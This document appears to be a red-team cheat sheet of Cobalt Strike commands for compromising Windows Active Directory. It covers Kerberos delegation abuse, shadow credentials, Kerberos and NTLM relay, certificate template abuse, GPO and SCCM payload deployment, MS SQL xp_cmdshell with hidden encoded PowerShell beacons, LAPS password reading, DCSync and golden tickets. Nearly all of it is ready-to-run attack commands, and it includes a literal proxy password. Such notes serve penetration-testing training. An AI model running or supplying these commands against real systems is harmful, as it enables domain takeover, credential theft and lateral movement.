`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:[user (local admin)] /self /altservice:[service]/[target] /user:[machine]$ /ticket:[base64 (machine tgt)] /nowrap`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[domain] /username:[user] /password:FakePass /ticket:[base64 (previous command)]`
`steal_token [pid]`
#### Create Computer Object
`powerpick Get-DomainObject -Identity "[domain written as dc=,dc=]" -Properties ms-DS-MachineAccountQuota`
`execute-assembly C:\Tools\StandIn\StandIn\StandIn\bin\Release\StandIn.exe --computer AwesomeSauce --make`

`C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /domain:[fqdn] /user:AwesomeSauce$ /password:[password (previous command)]`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:AwesomeSauce$ /aes256:[hash] /opsec /nowrap`
#### RBCD

Requirements
1. target where you can modify `msDS-AllowedToActOnBehalfOfOtherIdentity`
2. control of a principal that has an SPN (e.g. computer account)

Check Requirement 1
`powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`
`powerpick Get-DomainSID`

`powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "[domain sid]-[\d]{4,10}" } | fl ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier`
`powerpick ConvertFrom-SID [SecurityIdentifier]`
**SecurityIdentifier** can modify **ObjectAceType** on **ObjectDN** (target)
- **ObjectAceType** should be either **All** or **msDS-AllowedToActOnBehalfOfOtherIdentity**
- if **ObjectAceType** is **msDS-KeyCredentialLink**, see [[#Shadow Credentials]]

[[#Create Computer Object]] (Requirement 2)
*only if you haven't compromised a computer*

Attack
as account that can modify `msDS-AllowedToActOnBehalfOfOtherIdentity`
`powershell Set-ADComputer [target (dn notation)] -PrincipalsAllowedToDelegateToAccount [spn attacker owns]$`
check with `powershell Get-ADComputer [target] -Properties PrincipalsAllowedToDelegateToAccount`

as account with SPN (computer attacker owns)
see [[#Service Tickets]]
[[#Kerberos Tickets]] get TGT
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:[machine]$ /impersonateuser:[user (local admin on target)] /msdsspn:[service]/[target] /ticket:[base64] /nowrap`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:[domain] /username:[user] /password:FakePass /ticket:[base64 (previous command)]`
`steal_token [pid]`

Cleanup
`powerpick Get-DomainComputer -Identity [machine] | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity`
#### Shadow Credentials
Requires ability to modify `msDS-KeyCredentialLink`

Check Requirement
`powershell-import C:\Tools\PowerSploit\Recon\PowerView.ps1`
`powerpick Get-DomainSID`

`powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "WriteProperty|GenericWrite|GenericAll|WriteDacl" -and $_.SecurityIdentifier -match "[domain sid]-[\d]{4,10}" } | fl ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier`
`powerpick ConvertFrom-SID [SecurityIdentifier]`
**SecurityIdentifier** can modify **ObjectAceType** on **ObjectDN** (target)
- **ObjectAceType** should be either **All** or **msDS-KeyCredentialLink**
- if **ObjectAceType** is **msDS-AllowedToActOnBehalfOfOtherIdentity**, see [[#RBCD]]

`execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:[machine]$`
`execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe add /target:[machine]$`
run command whisker provides
[[#S4U2Self]]

Cleanup
`execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe remove /target:[machine]$ /deviceid:[deviceid]`
#### Kerberos Relay
local privilege escalation

Requirements:
- LDAP signing not enforced
- user has self rights (to configure RBCD or shadow creds)
- RBCD only: user owns existing computer or can create new computers
##### RBCD
computer: any computer you control or [[#Create Computer Object]]
objectsid: `powerpick Get-DomainComputer -Identity [computer] -Properties objectsid`
run on target,
port: `execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe`
`execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/[dc] -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -rbcd [objectsid] -port [port]`
check with `powershell Get-ADComputer [target] -Properties PrincipalsAllowedToDelegateToAccount`

computer tgt: [[#Kerberos Tickets]] (dump TGT) or [[#Create Computer Object]] (last command)
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /user:[computer]$ /impersonateuser:Administrator /msdsspn:host/[target (netbios)] /ticket:[base64 (computer tgt)] /ptt`
`elevate svc-exe-krb local`
##### Shadow Credentials
port: `execute-assembly C:\Tools\KrbRelay\CheckPort\bin\Release\CheckPort.exe`
`execute-assembly C:\Tools\KrbRelay\KrbRelay\bin\Release\KrbRelay.exe -spn ldap/[dc] -clsid 90f18417-f0f1-484e-9d3c-59dceee5dbd8 -shadowcred -port [port]`
check with `execute-assembly C:\Tools\Whisker\Whisker\bin\Release\Whisker.exe list /target:[target]$`

`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[target]$ /certificate:[base64 (previous command)] /password:[password (previous command)] /enctype:aes256 /nowrap`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe s4u /impersonateuser:Administrator /self /altservice:host/[target (netbios)] /user:[target]$ /ticket:[base64 (previous command)] /ptt`
`elevate svc-exe-krb local`
## Active Directory Certificate Services
`execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe cas`
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe certificates`
#### Misconfigured Certificate Templates
`execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe find /vulnerable`

`execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request /ca:[CA Name] /template:[Template Name] /altname:[any user]`
copy certificate (both private key and certificate) to cert.pem
`openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx`
`cat cert.pfx | base64 -w 0`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[user] /certificate:[base64] /password:[password] /enctype:aes256 /opsec /nowrap`
[[#Pass-the-Ticket]]
#### NTLM Relaying to HTTP Endpoints
`powershell New-NetFirewallRule -DisplayName "8445-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8445`

`cd C:\Windows\System32\Drivers`
`upload PortBender\WinDivert64.sys`
`PortBender redirect 445 8445`
`rportfwd 8445 localhost 445`
`socks 1080 socks5 disableNoAuth john S@lcianaszkot23 enableLogging`

`sudo proxychains ntlmrelayx.py -t https://[ca]/certsrv/certfnsh.asp -smb2support --adcs --no-http-server`
[[#Forcing NTLM Authentication]]

`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[user] /certificate:[base64] /enctype:aes256 /opsec /nowrap`
[[#S4U2Self]]

Cleanup
`powershell Remove-NetFirewallRule -DisplayName "8445-In"`

`jobs`
`jobkill [jid]`
`kill [pid]`

`rportfwd stop 8445`
`socks stop`
## Group Policy
#### Modify Existing GPO
`powerpick Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "[domain sid]-[\d]{4,10}" }`

- **GPO:** `powerpick Get-DomainGPO -Identity "[objectdn]" | select displayName, gpcFileSysPath`
- **Security ID:** `ConvertFrom-SID [securityidentifier]`
- **Links:** `Get-DomainOU -GPLink "{[objectdn (only section in {})]}" | select distinguishedname`
- **Computers:** `Get-DomainComputer -SearchBase "[links]" | select dnsHostName`
**Security ID** can write to **GPO**, which affects **Computers**

[[#Serving Payload Internally (SMB)]]
`execute-assembly C:\Tools\SharpGPOAbuse\SharpGPOAbuse\bin\Release\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b [share]\dns_x64.exe" --GPOName [gpo]`
#### Create and Link a GPO

Requirements
1. control of a principal that can create GPOs
2. GPO can be linked to an OU (an OU grants WriteProperty over GP-Link)

Check Requirement 1
`powerpick Get-DomainObjectAcl -Identity "CN=Policies,CN=System,[domain (dn notation)]" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }`

Check Requirement 2
`powerpick Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl`
GPO can be linked to **ObjectDN** by **SecurityIdentifier**

Attack
check for optional GPO management PowerShell module: `powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands`
Install if not installed: `Install-WindowsFeature GPMC`

[[#Serving Payload Internally (SMB)]]

as principal that can create GPO
`powershell New-GPO -Name "Updater"`
`powershell Set-GPPrefRegistryValue -Name "Updater" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c [share]\dns_x64.exe" -Type ExpandString`
as principal that can link GPO
`powershell Get-GPO -Name "Updater" | New-GPLink -Target "[ObjectDN]"`
## MS SQL Servers
`powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1`

`powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`

SQL Instance
`powershell Get-SQLInstanceDomain`
`powershell Get-SQLInstanceBroadcast`
`powershell Get-SQLInstanceScanUDP`

Server Information
`powershell Get-SQLConnectionTest -Instance "[host],[port]" | fl`
`powershell Get-SQLServerInfo -Instance "[host],[port]"`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:info`

Getting Access
search SPNs: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns`
search SQL users: `powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }`

current user: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:whoami`
pass-the-password: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:windomain /d:[domain] /u:[user] /p:[password] /h:[host],[port] /m:whoami`

Query
`powershell Get-SQLQuery -Instance "[host],[port]" -Query "select @@servername"`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:query /c:"select @@servername"`
`proxychains mssqlclient.py -windows-auth [domain]/[user]@[host]`
#### MS SQL Impersonation
Requirement: impersonate is explicitly granted for a user

Check Impersonate Permissions
`SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';`
`SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;`

`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:impersonate`

Impersonate
`EXECUTE AS login = '[user]'; [query]`

check access: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:iwhoami /i:[user]`
query: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:iquery /i:[user] /c:[query]`
#### MS SQL Command Execution

Manual
`SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`
`sp_configure 'Show Advanced Options', 1; RECONFIGURE;`
`sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
`EXEC xp_cmdshell '[command]';`

PowerUpSQL
`powershell Invoke-SQLOSCmd -Instance "[host],[port]" -Command "[command]" -RawResults`

SQLRecon
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:enablexp`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:xpcmd /c:[command]`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:disablexp`

as another user (impersonate),
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:ienablexp /i:[user]`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:ixpcmd /i:[user] /c:[command]`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:idisablexp /i:[user]`
#### Command Execution → Beacon
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
`rportfwd 8080 127.0.0.1 80`

`portscan [sql server] 445`
host either smb_x64.ps1 (port 445 open) or tcp_x64.ps1 (port 445 closed)
[[#PowerShell Payload (base64)]]

`connect [sql server] 4444`
`link [sql server] [pipe]`
#### MS SQL Lateral Movement

Manual
`SELECT srvname, srvproduct, rpcout FROM master..sysservers;`
`SELECT * FROM OPENQUERY("[target (srvname)]", '[query]');`

**Note:** when using **xp_cmdshell** with **OpenQuery**, prepend a dummy query before it or else it won’t work: `SELECT * FROM OPENQUERY("[target]", 'select @@servername; exec xp_cmdshell ''powershell [...]''')`

SQLRecon
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:links`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lquery /l:[target] /c:"[query]"`

Crawl SQL Server Links
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:llinks /l:[target]`
crawl recursively: `powershell Get-SQLServerLinkCrawl -Instance "[host],[port]"`

Check xp_cmdshell
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lquery /l:[target] /c:"select name,value from sys.configurations WHERE name = ''xp_cmdshell''"`

**Note:** xp_cmdshell can’t be enabled through **OpenQuery**, only through **RPC Out** which is not enabled by default. If it is enabled,
`EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target]`
`EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target]`

Command Execution
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lxpcmd /l:[target] /c:"[command]"`
[[#Command Execution → Beacon]]
#### MS SQL Privilege Escalation
`execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges`

on beacon,
`rportfwd 8080 127.0.0.1 80`

on target,
use payload local_x64.ps1
[[#PowerShell Payload (base64)]]

`execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -a "-w hidden -enc [base64]"`
`connect localhost 4444`
#### Data Extraction
*Raw Queries*
Tables: `SELECT * FROM information_schema.tables`
Columns: `SELECT column_name from information_schema.columns WHERE table_name="[table]"`
Data: `SELECT [columns] FROM dbo.[table]`
Data Sample: `SELECT TOP 5 [columns] FROM dbo.[table]`

Search Keywords
`powershell Get-SQLColumnSampleDataThreaded -Keywords "[words (comma separated)]" -SampleSize 5 | select instance,database,column,sample | ft -autosize`
#### MS SQL Copy & Paste
`powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1`

search servers: `powerpick Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo`

search SPNs: `execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /enum:sqlspns`
search SQL users: `powerpick Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }`
search links: `powerpick Get-SQLServerLinkCrawl -Instance "[host],[port]"`

`proxychains mssqlclient.py -windows-auth [domain]/[user]@[host]`
##### MS SQL PowerShell Payload
on beacon,
`powershell New-NetFirewallRule -DisplayName "8080-In" -Direction Inbound -Protocol TCP -Action Allow -LocalPort 8080`
`rportfwd 8080 127.0.0.1 80`

`portscan [target] 445`
host either smb_x64.ps1 (port 445 open) or tcp_x64.ps1 (port 445 closed)
[[#PowerShell Payload (base64)]]
##### Normal
Check Privileges
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:whoami`
Query
`powerpick Get-SQLQuery -Instance "[host],[port]" -Query "SELECT @@SERVERNAME"`
Command
`powerpick Invoke-SQLOSCmd -Instance "[host],[port]" -Command "whoami" -RawResults`
**Note:** auto-enables and disables xp_cmdshell
Beacon
[[#MS SQL PowerShell Payload]]
`powerpick Invoke-SQLOSCmd -Instance "[host],[port]" -Command "powershell -w hidden -enc [base64]" -RawResults`

*Raw Queries*
Query
`SELECT @@SERVERNAME`
Check xp_cmdshell
`SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`
Enable xp_cmdshell
`sp_configure 'Show Advanced Options', 1; RECONFIGURE;`
`sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
Command
`EXEC xp_cmdshell 'whoami';`
Beacon
[[#MS SQL PowerShell Payload]]
`EXEC xp_cmdshell 'powershell -w hidden -enc [base64]';`
##### Impersonate
Check Impersonation
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:impersonate`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:iwhoami /i:[user]`
Query
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:iquery /i:[user] /c:"SELECT SYSTEM_USER;"`
Check xp_cmdshell
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:iquery /i:[user] /c:"SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';"`
Enable xp_cmdshell
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:ienablexp /i:[user]`
Command
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:ixpcmd /i:[user] /c:"whoami"`
Beacon
[[#MS SQL PowerShell Payload]]
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:ixpcmd /i:[user] /c:"powershell -w hidden -enc [base64]"`

*Raw Queries*
Check Impersonation
`SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';`
`SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;`
Query
`EXECUTE AS login = '[user]'; SELECT SYSTEM_USER;`
Check xp_cmdshell
`EXECUTE AS login = '[user]'; SELECT value FROM sys.configurations WHERE name = 'xp_cmdshell';`
Enable xp_cmdshell
`EXECUTE AS login = '[user]'; sp_configure 'Show Advanced Options', 1; RECONFIGURE;`
`EXECUTE AS login = '[user]'; sp_configure 'xp_cmdshell', 1; RECONFIGURE;`
Command
`EXECUTE AS login = '[user]'; EXEC xp_cmdshell 'whoami';`
Beacon
[[#MS SQL PowerShell Payload]]
`EXECUTE AS login = '[user]'; EXEC xp_cmdshell 'powershell -w hidden -enc [base64]';`
##### Over Link
Check Links
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:links`
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lwhoami /l:[target]`
Query
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lquery /l:[target] /c:"SELECT @@SERVERNAME"`
Check xp_cmdshell
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lquery /l:[target] /c:"SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell'';"`
Check RPC
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:checkrpc`
Enable RPC
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:enablerpc /rhost:[target]`
Enable xp_cmdshell (RPC)
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lenablexp /l:[target]`
Command
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lxpcmd /l:[target] /c:"[command]"`
Beacon
[[#MS SQL PowerShell Payload]]
`execute-assembly C:\Tools\SQLRecon\SQLRecon\bin\Release\SQLRecon.exe /a:wintoken /h:[host],[port] /m:lxpcmd /l:[target] /c:"powershell -w hidden -enc [base64]"`

*Raw Queries*
Check Links
`SELECT srvname, srvproduct, rpcout FROM master..sysservers;`
Query
`SELECT * FROM OPENQUERY("[target (srvname)]", 'SELECT @@SERVERNAME');`
Check xp_cmdshell
`SELECT * FROM OPENQUERY("[target]", 'SELECT value FROM sys.configurations WHERE name = ''xp_cmdshell''');`
Enable xp_cmdshell (RPC)
`EXEC('sp_configure ''show advanced options'', 1; reconfigure;') AT [target]`
`EXEC('sp_configure ''xp_cmdshell'', 1; reconfigure;') AT [target]`
Command
`SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''whoami''')`
**Note:** when using **xp_cmdshell** with **OpenQuery**, prepend a dummy query before it or else it won’t work.
Beacon
[[#MS SQL PowerShell Payload]]
`SELECT * FROM OPENQUERY("[target]", 'SELECT @@SERVERNAME; exec xp_cmdshell ''powershell -w hidden -enc [base64]''')`
## Microsoft Configuration Manager
**Note:** I couldn't get these commands to work with some of the default payloads. If you get no output, try to find the pid of the conhost.exe child process and `inject [pid] x64 [payload]`
#### Enumeration
`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local site-info --no-banner`
- same as `powershell Get-WmiObject -Class SMS_Authority -Namespace root\CCM | select Name, CurrentManagementPoint | fl`

`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get site-info -d [domain] --no-banner`
`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get class-instances SMS_Admin --no-banner`
**LogonName** has **RoleNames** permissions over **CollectionNames**

`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collections --no-banner`
**Note:** You may see different collections as a different user!
`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get collection-members -n [collection] --no-banner`
`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get devices -n [member] -p Name -p FullDomainName -p IPAddresses -p LastLogonUserName -p OperatingSystemNameandVersion --no-banner`
#### Network Access Account (NAA) Credentials
used to login for computers that are not domain-joined
- passed to the machine to be encrypted using DPAPI and stored locally

`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe local naa -m wmi --no-banner`
alternatively, as local admin: `execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe get naa --no-banner`
#### Lateral Movement
requires **Full Administrator** or **Application Administrator** privileges
[[#Serving Payload Internally (SMB)]]
`execute-assembly C:\Tools\SharpSCCM\bin\Release\SharpSCCM.exe exec -n [collection] -p "C:\Windows\System32\cmd.exe /c start /b [share]\dns_x64.exe" -s --no-banner`
## LAPS
#### Identifying LAPS
check on disk of joined machine for `C:\Program Files\LAPS\CSE`
search GPO named LAPS: `powerpick Get-DomainGPO | ? { $_.DisplayName -like "*laps*" } | select DisplayName, Name, GPCFileSysPath | fl`
computers where ms-Mcs-AdmPwdExpirationTime is not null: `powerpick Get-DomainComputer | ? { $_."ms-Mcs-AdmPwdExpirationTime" -ne $null } | select dnsHostName`
#### Reading LAPS Password

Check for LAPS Password Readers
`powerpick Get-DomainComputer | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "ms-Mcs-AdmPwd" -and $_.ActiveDirectoryRights -match "ReadProperty" } | fl ObjectDn, SecurityIdentifier`
`powerpick ConvertFrom-SID [SecurityIdentifier]`
**SecurityIdentifier** can read LAPS password on **ObjectDN**

`powershell-import C:\Tools\LAPSToolkit\LAPSToolkit.ps1`
`powerpick Find-LAPSDelegatedGroups`
`powershell Find-LapsADExtendedRights`
`powershell Find-AdmPwdExtendedRights`

Read LAPS Password
`powerpick Get-DomainComputer -Identity [computer] -Properties ms-Mcs-AdmPwd`
`powershell Get-LapsADPassword -ComputerName [computer] | fl`
`powershell Get-AdmPwdPassword -ComputerName [computer] | fl`
`make_token .\LapsAdmin [ms-mcs-admpwd]`
#### Password Expiration Protection
[https://www.epochconverter.com/ldap](https://www.epochconverter.com/ldap) ⇒ convert time to/from human-readable format

Get Expiration
`powerpick Get-DomainComputer -Identity [computer] -Properties ms-Mcs-AdmPwd,ms-Mcs-AdmPwdExpirationTime`
Set Expiration
`powerpick Set-DomainObject -Identity [computer] -Set @{'ms-Mcs-AdmPwdExpirationTime' = '[time]'} -Verbose`
## Domain Trusts
`powerpick Get-DomainTrust -Domain [domain]`

`powerpick Get-DomainController -Domain [target] | select Name`
`powerpick Get-DomainComputer -Domain [target] -Properties DnsHostName`
#### Two-Way (Parent/Child)
`powerpick Get-DomainGroup -Identity "Domain Admins" -Domain [target] -Properties ObjectSid`
`powerpick Get-DomainSID`

golden ticket: `C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe golden /aes256:[krbtgt hash] /user:Administrator /domain:[current] /sid:[domain sid] /sids:[objectsid] /nowrap`
diamond ticket: `execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe diamond /tgtdeleg /ticketuser:Administrator /ticketuserid:500 /groups:519 /sids:[objectsid] /krbkey:[krbtgt aes256 hash] /nowrap`

[[#Pass-the-Ticket]]
#### One-Way Inbound (yay)

Find user on current domain that belongs to Administrators group in target domain
`powerpick Get-DomainForeignGroupMember -Domain [target]`
`powerpick ConvertFrom-SID [MemberName]`
`powerpick Get-DomainGroupMember -Identity "[group]" | select MemberName`

obtain user TGT: [[#Kerberos Tickets]] or [[#Overpass-the-Hash]]
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:krbtgt/[target] /domain:[current] /dc:[current dc] /ticket:[tgt] /nowrap`

see [[#Service Tickets]]
`powerpick Get-DomainController -Domain [target] | select Name`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgs /service:[service]/[target dc] /domain:[target] /dc:[target dc] /ticket:[base64 (previous command)] /nowrap`
[[#Pass-the-Ticket]]
#### One-Way Outbound (sad)
can only get domain user access

Obtain Trusted Domain Object (TDO) key
on DC: `mimikatz !lsadump::trust /patch`
- risky because it involves memory patching

vs
`execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=trustedDomain)" --domain [current] --attributes distinguishedName,name,trustDirection`
`powerpick Get-DomainObject -Identity "[distinguisedName]" | select objectGuid`
`mimikatz @lsadump::dcsync /domain:[current] /guid:{[objectGuid]}`
get **rc4_hmac_nt** hash in **Out** (not **Out-1**)

User Access
trust: account in the "trusted" (target) domain with the name of the "trusting" (current) domain
in a different trusted domain that you can access, find trust: `execute-assembly C:\Tools\ADSearch\ADSearch\bin\Release\ADSearch.exe --search "(objectCategory=user)"`
`execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:[trust]$ /domain:[target] /rc4:[hash] /nowrap`
[[#Pass-the-Ticket]]

next, try [[#Kerberos]] attacks or [[#Misconfigured Certificate Templates]]
- run PowerView or PowerShell AD commands with `-Server [target dc]`
- run Rubeus commands with `/domain:[target] /dc:[target dc]`
- run Certify with `/domain:[target] /ldapserver:[target dc]`
- modify Certify source if necessary: https://github.com/GhostPack/Certify/issues/13#issuecomment-1716046133
## Application Whitelisting
#### Policy Enumeration
**Note:** DLL rules are not enforced

GPO
`powerpick Get-DomainGPO -Domain [domain] | ? { $_.DisplayName -like "*AppLocker*" } | select displayname, gpcfilesyspath`
`download [gpcfilesyspath]\Machine\Registry.pol`

`Install-Module -Name GPRegistryPolicy`
`Parse-PolFile -Path [path]`

Local Machine
`powershell Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2"`
`powershell Get-ChildItem "HKLM:Software\Policies\Microsoft\Windows\SrpV2\[Name]"`
#### PowerShell CLM
Error: only core types in this language mode
`powershell $ExecutionContext.SessionState.LanguageMode`
Solution: use powerpick instead of powershell
#### Beacon DLL
`run C:\Windows\System32\rundll32.exe [payload].dll,StartW`
## Host Persistence (User)
#### Task Scheduler
